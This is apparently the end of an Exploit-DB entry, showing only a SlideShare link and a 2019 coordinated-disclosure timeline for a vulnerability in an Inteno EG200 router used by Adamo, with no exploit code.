https://www.slideshare.net/fuguet/call-your-key-to-phone-all

# Timeline:
2019-06-29 - White Paper done
2019-07-01 - CVE assigned
2019-07-09 - Notified to Inteno
2019-07-11 - Adamo aware and ask for detailed info
2019-07-12 - Info facilitated
2019-07-25 - Early patch available and applied (Cooperation starts)
2019-07-26 - Tested and failed (VoIP not working)
2019-08-27 - New firmware available
2019-08-30 - Firmware EG200-WU7P1U_ADAMO3.16.8-190820_0937 applied on router
2019-08-31 - Tested OK
2019-09-04 - Disclosure published

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

¬©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

√ó

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as ‚ÄúGoogle Hacking‚Äù was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny‚Äôs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term ‚ÄúGoogledork‚Äù to refer
to ‚Äúa foolish or inept person as revealed by Google‚Äú. This was meant to draw attention to
the fact that this was not a ‚ÄúGoogle problem‚Äù but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term ‚Äúdork‚Äù became shorthand for a search query that located sensitive
information and ‚Äúdorks‚Äù were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

√ó

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

√ó

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


